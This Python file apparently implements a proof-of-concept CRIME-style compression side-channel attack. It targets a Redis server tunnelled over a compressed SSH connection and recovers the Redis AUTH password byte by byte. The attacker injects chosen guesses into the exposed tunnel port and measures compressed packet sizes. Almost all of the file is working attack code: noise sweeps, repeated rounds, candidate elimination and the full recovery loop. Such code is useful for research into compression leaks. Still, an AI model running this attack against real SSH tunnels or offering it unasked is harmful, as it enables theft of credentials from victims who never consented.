"""CRIME-style chosen-payload attack against SSH compression.

Port-forward variant
--------------------
The victim tunnels a Redis server through a compressed SSH connection.
The tunnel is bound to ``0.0.0.0`` and therefore reachable from the
attacker's network.  The victim's application authenticates to Redis
with ``AUTH default <password>`` through the same tunnel.

The attacker injects data by opening TCP connections to the victim's
Redis tunnel port.  Data sent on those connections enters the SSH tunnel
as ``direct-tcpip`` channel data in the **client-to-server** direction,
sharing the zlib compression context with the victim's Redis AUTH
traffic.

Repeat-until-confident strategy
-------------------------------
Each byte position is recovered by sweeping 8 noise lengths (0..7) per
round and accumulating candidate sums across rounds.  After each round
the margin (difference between best and second-best sum) is checked.
If the margin exceeds a configurable threshold (default 16 wire bytes),
the position is considered resolved.  Otherwise another round is run
with fresh tunnel connections whose CHANNEL_OPEN bit-alignment jitter
is independent of previous rounds, so the compression signal accumulates
while the jitter averages out.

This makes the attack robust against the per-connection alignment noise
inherent in the port-forward scenario without requiring a fixed large
noise sweep that might still land entirely in one padding bin.
"""

from __future__ import annotations

import asyncio
import logging
import os
import secrets
import time
from typing import Any

import aiohttp

LOG = logging.getLogger("attack")

CLIENT_BASE = os.environ.get("CLIENT_CONTROL_URL", "http://client:8000")
CLIENT_HOST = os.environ.get("CLIENT_HOST", "client")
TUNNEL_PORT = int(os.environ.get("TUNNEL_PORT", "6379"))
LISTEN_PORT = int(os.environ.get("LISTEN_PORT", "2222"))


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def _c2s_total(records: list[dict[str, Any]]) -> int:
    """Sum c->s TCP payload bytes from one half of the forwarder."""
    return sum(
        r["tcp_payload_len"] for r in records
        if r["dport"] == LISTEN_PORT and r["tcp_payload_len"] > 0
    )


async def _open_tunnel(retries: int = 20, delay: float = 1.0):
    """Open a TCP connection to the client's exposed tunnel."""
    for attempt in range(1, retries + 1):
        try:
            return await asyncio.open_connection(CLIENT_HOST, TUNNEL_PORT)
        except (OSError, ConnectionRefusedError) as exc:
            if attempt < retries:
                LOG.warning("tunnel connect attempt %d: %s", attempt, exc)
                await asyncio.sleep(delay)
            else:
                raise
    raise RuntimeError("unreachable")


# 8-bit DEFLATE literals (codes 0..143) absent from dictionary content.
_NOISE_POOL = list(range(0x80, 0x90))


def _make_noise(noise_len: int) -> bytes:
    """8-bit DEFLATE-literal noise drawn from ``_NOISE_POOL``."""
    if noise_len > len(_NOISE_POOL):
        raise ValueError(f"noise_len {noise_len} > pool size {len(_NOISE_POOL)}")
    return bytes(_NOISE_POOL[:noise_len])


# ---------------------------------------------------------------------------
# single-round sweep
# ---------------------------------------------------------------------------

async def _sweep_round(
    session: aiohttp.ClientSession,
    packet_log,
    prefix: bytes,
    alphabet: list[bytes],
    noise_lengths: list[int],
    settle: float,
    flush_bytes: int,
) -> dict[bytes, int]:
    """Run one noise-length sweep and return per-candidate wire-byte sums.

    Each (candidate, noise_length) iteration opens a **fresh** web-tunnel
    connection for flush and measure.  The CHANNEL_OPEN for each fresh
    connection has a different originator port, giving a random
    bit-alignment offset that varies between rounds — which is why
    repeating rounds lets the real signal accumulate while jitter
    averages out.

    Ordering within one iteration:

      1. Flush -- throwaway tunnel, 33 KiB random bytes.
      2. Open the measure tunnel -- CHANNEL_OPEN enters the compressor
         *before* the secret.
      3. Settle -- let CHANNEL_OPEN reach the sniffer.
      4. Trigger Redis AUTH -- secret enters compressor right before the
         guess, with no channel-management bytes in between.
      5. Settle.
      6. Clear packet log.
      7. Write guess on the measure tunnel.
      8. Settle.
      9. Read packet log.
    """
    sums: dict[bytes, int] = {c: 0 for c in alphabet}
    per_nl: dict[int, dict[bytes, int]] = {
        nl: {c: 0 for c in alphabet} for nl in noise_lengths
    }
    for noise_len in noise_lengths:
        noise = _make_noise(noise_len)
        for cb in alphabet:
            # 1. Flush (throwaway connection) -------------------------------
            flush_data = secrets.token_bytes(flush_bytes)
            try:
                _, fw = await _open_tunnel()
                fw.write(flush_data)
                await fw.drain()
            except (ConnectionResetError, BrokenPipeError, OSError):
                pass
            if settle > 0:
                await asyncio.sleep(settle)

            # 2-3. Open measure tunnel, let CHANNEL_OPEN settle ------------
            _, mw = await _open_tunnel()
            if settle > 0:
                await asyncio.sleep(settle)

            # 4-5. Refresh secret ------------------------------------------
            async with session.post(f"{CLIENT_BASE}/send_secret") as r:
                await r.read()
            if settle > 0:
                await asyncio.sleep(settle)

            # 6-9. Clear, guess, settle, read ------------------------------
            packet_log.clear()
            mw.write(prefix + cb + noise)
            await mw.drain()
            if settle > 0:
                await asyncio.sleep(settle)
            measured = _c2s_total(packet_log.snapshot())
            sums[cb] += measured
            per_nl[noise_len][cb] = measured

            try:
                mw.close()
            except Exception:  # noqa: BLE001
                pass

    return sums, per_nl


# ---------------------------------------------------------------------------
# per-position recovery with repeat-until-confident
# ---------------------------------------------------------------------------

async def crack_byte_position(
    session: aiohttp.ClientSession,
    packet_log,
    prefix: bytes,
    alphabet: list[bytes],
    noise_lengths: list[int],
    settle: float,
    flush_bytes: int,
    min_margin: int,
    max_rounds: int,
    log_prefix: str,
    hint_noise: list[int] | None = None,
    sweep_fn=None,
    adaptive_noise: bool = True,
) -> tuple[bytes, dict[bytes, int], list[int]]:
    """Recover one byte, repeating rounds until *margin >= min_margin*.

    Returns ``(best_candidate, cumulative_sums, final_active_noise)``
    so the caller can pass ``final_active_noise`` as ``hint_noise``
    to the next byte position.

    Three progressive optimisations reduce work:

    * **Noise hint from previous position**: if *hint_noise* is
      provided (the productive noise lengths from the preceding byte
      position, expanded by ±1 to cover the ~1-byte prefix-growth
      shift), round 1 uses that small set instead of a full 8-sweep.
      If it produces no signal, round 2 falls back to the full set.
    * **Adaptive noise sweep**: after the first round that uses the
      full set, noise lengths with no differential signal are dropped.
    * **Candidate elimination**: after each round, candidates whose
      cumulative sum exceeds ``best_sum + min_margin`` are dropped.
    """
    if sweep_fn is None:
        sweep_fn = _sweep_round

    sums: dict[bytes, int] = {c: 0 for c in alphabet}
    active = list(alphabet)
    prev_margin = 0
    stall_count = 0

    # Start with the hint set (from the previous position) if
    # available, otherwise use the full set.
    if adaptive_noise and hint_noise and len(hint_noise) < len(noise_lengths):
        active_noise = list(hint_noise)
    else:
        active_noise = list(noise_lengths)

    all_noise = set(noise_lengths)
    did_initial_prune = False

    for rnd in range(1, max_rounds + 1):
        round_sums, round_per_nl = await sweep_fn(
            session, packet_log, prefix, active,
            active_noise, settle, flush_bytes,
        )
        for c in active:
            sums[c] += round_sums[c]

        ranked = sorted(
            [(c, sums[c]) for c in active], key=lambda kv: kv[1],
        )
        best, best_sum = ranked[0]
        second, second_sum = ranked[1] if len(ranked) > 1 else ranked[0]
        margin = second_sum - best_sum

        # Eliminate candidates that fell too far behind.
        before = len(active)
        active = [c for c, s in ranked if s - best_sum < min_margin]
        if len(active) < 2:
            active = [c for c, _ in ranked[:2]]
        eliminated = before - len(active)

        # Adaptive noise: after the first round, prune noise lengths
        # that showed no differential signal (keep productive +
        # neighbours, minimum 3).
        noise_delta = 0
        if adaptive_noise and not did_initial_prune:
            productive = set()
            for nl in active_noise:
                vals = list(round_per_nl[nl].values())
                if min(vals) < max(vals):
                    productive.add(nl)
            if productive:
                n = noise_lengths[-1] + 1  # modulus (typically 8)
                keep = set()
                for nl in productive:
                    keep.add(nl)
                    keep.add((nl - 1) % n)
                    keep.add((nl + 1) % n)
                new_noise = sorted(keep)
                if len(new_noise) >= 3:
                    noise_delta = len(new_noise) - len(active_noise)
                    active_noise = new_noise
            did_initial_prune = True

        # Stall detection: if margin hasn't grown for 2 consecutive
        # rounds and we're using a reduced noise set, expand by ±1
        # to recover crossing noise_lengths lost to channel jitter.
        if margin <= prev_margin and eliminated == 0:
            stall_count += 1
        else:
            stall_count = 0
        prev_margin = margin

        if adaptive_noise and stall_count >= 2 and len(active_noise) < len(noise_lengths):
            n = noise_lengths[-1] + 1
            expanded = set(active_noise)
            for nl in list(expanded):
                expanded.add((nl - 1) % n)
                expanded.add((nl + 1) % n)
            new_noise = sorted(expanded)
            noise_delta = len(new_noise) - len(active_noise)
            active_noise = new_noise
            stall_count = 0
            LOG.info("%s round=%d stall, expanding noise",
                     log_prefix, rnd)

        LOG.info(
            "%s round=%d best=%r sum=%d  2nd=%r sum=%d  "
            "margin=%d  alive=%d (-%d)  noise=%d (%+d)",
            log_prefix, rnd,
            best.decode("latin-1"), best_sum,
            second.decode("latin-1"), second_sum,
            margin, len(active), eliminated,
            len(active_noise), noise_delta,
        )
        if margin >= min_margin:
            break
    else:
        LOG.warning("%s margin=%d after %d rounds (threshold=%d)",
                    log_prefix, margin, max_rounds, min_margin)

    return best, sums, active_noise


# ---------------------------------------------------------------------------
# full attack
# ---------------------------------------------------------------------------

async def run_attack(
    packet_log,
    known_prefix: bytes = b"*3\r\n$4\r\nAUTH\r\n$7\r\ndefault\r\n$",
    alphabet_str: str = "abcdefghijklmnopqrstuvwxyz0123456789",
    max_length: int = 32,
    noise_lengths: list[int] | None = None,
    terminator: bytes = b"\r",
    settle: float = 0.003,
    flush_bytes: int = 33000,
    min_margin: int = 16,
    max_rounds: int = 64,
    sweep_fn=None,
    adaptive_noise: bool = True,
) -> dict[str, Any]:
    if noise_lengths is None:
        noise_lengths = list(range(8))
    alphabet = [bytes([c]) for c in alphabet_str.encode("utf-8")]
    if terminator not in alphabet:
        alphabet.append(terminator)

    LOG.info(
        "starting attack: known_prefix=%r alphabet_size=%d "
        "noise_lengths=%s settle=%.3f flush_bytes=%d "
        "min_margin=%d max_rounds=%d",
        known_prefix, len(alphabet), noise_lengths, settle,
        flush_bytes, min_margin, max_rounds,
    )

    started = time.time()
    recovered = b""
    history: list[dict[str, Any]] = []
    prev_noise: list[int] | None = None  # carried across positions

    timeout = aiohttp.ClientTimeout(total=1800)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        for pos in range(max_length):
            # Build a noise hint from the previous position's active
            # set, shifted by +1 mod 8.  The prefix grew by one byte,
            # increasing the compressed size by ~1 byte, so the
            # padding-boundary crossing moves one noise_len earlier
            # (i.e. the productive noise_len index increases by 1).
            hint: list[int] | None = None
            if prev_noise is not None:
                nl_set = set(noise_lengths)
                hint = sorted({(nl - 1) % (noise_lengths[-1] + 1)
                               for nl in prev_noise} & nl_set)

            # Trim from the front so len(prefix + candidate) is
            # constant across positions.  Keeps LZ77 match lengths in
            # the same DEFLATE length-code bin, avoiding positions
            # where the signal drops from 8 to 7 bits.
            full_prefix = known_prefix + recovered
            trim = max(0, len(full_prefix) - len(known_prefix))
            full_prefix = full_prefix[trim:]

            best, sums, prev_noise = await crack_byte_position(
                session, packet_log,
                prefix=full_prefix,
                alphabet=alphabet,
                noise_lengths=noise_lengths,
                settle=settle,
                flush_bytes=flush_bytes,
                min_margin=min_margin,
                max_rounds=max_rounds,
                log_prefix=f"pos {pos:2d}",
                hint_noise=hint,
                sweep_fn=sweep_fn,
                adaptive_noise=adaptive_noise,
            )
            ranked = [
                (k.decode("latin-1"), v)
                for k, v in sorted(sums.items(), key=lambda kv: kv[1])
            ]
            history.append({
                "position": pos,
                "best": best.decode("latin-1"),
                "ranked": ranked[:6],
            })
            if best == terminator:
                LOG.info("hit terminator at position %d -> done", pos)
                break
            recovered += best
            LOG.info("recovered so far: %r",
                     recovered.decode("latin-1"))
        else:
            LOG.warning("hit max_length=%d without terminator", max_length)

    elapsed = time.time() - started
    LOG.info("attack done in %.1fs: recovered=%r",
             elapsed, recovered.decode("latin-1"))
    return {
        "recovered": recovered.decode("latin-1"),
        "elapsed_seconds": elapsed,
        "history": history,
    }
